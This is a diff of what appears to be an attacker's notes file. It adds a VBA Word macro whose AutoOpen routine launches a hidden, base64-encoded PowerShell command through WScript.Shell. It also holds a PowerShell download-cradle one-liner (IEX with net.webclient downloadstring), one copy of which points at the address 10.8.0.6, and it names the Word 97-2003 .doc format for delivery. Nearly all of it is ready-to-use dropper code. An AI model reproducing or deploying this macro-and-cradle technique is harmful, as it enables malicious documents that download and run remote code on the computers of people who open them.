@@ -48,3 +48,39 @@ $str = "IEX ((new-object net.webclient).downloadstring('http://10.8.0.6:80/http-
 PS > $str = "IEX ((new-object net.webclient).downloadstring('http://'))"
 PS > [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
 
+#MACRO
+Sub DoStuff()
+    Dim wsh As Object
+    Set wsh = CreateObject("WScript.Shell")
+    wsh.Run ""
+    Set wsh = Nothing
+End Sub
+
+Sub AutoOpen()
+    DoStuff
+End Sub
+
+Sub DoStuff()
+    Dim wsh As Object
+    Set wsh = CreateObject("WScript.Shell")
+    wsh.Run "powershell -Sta -Nop -Window Hidden -EncodedCommand "
+    Set wsh = Nothing
+End Sub
+
+Sub AutoOpen()
+    DoStuff
+End Sub
+
+ $str = "IEX ((new-object net.webclient).downloadstring('http://'))"
+[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
+
+Word 97-2003 Document (*.doc).
+
+
+
+
+
+
+
+
+
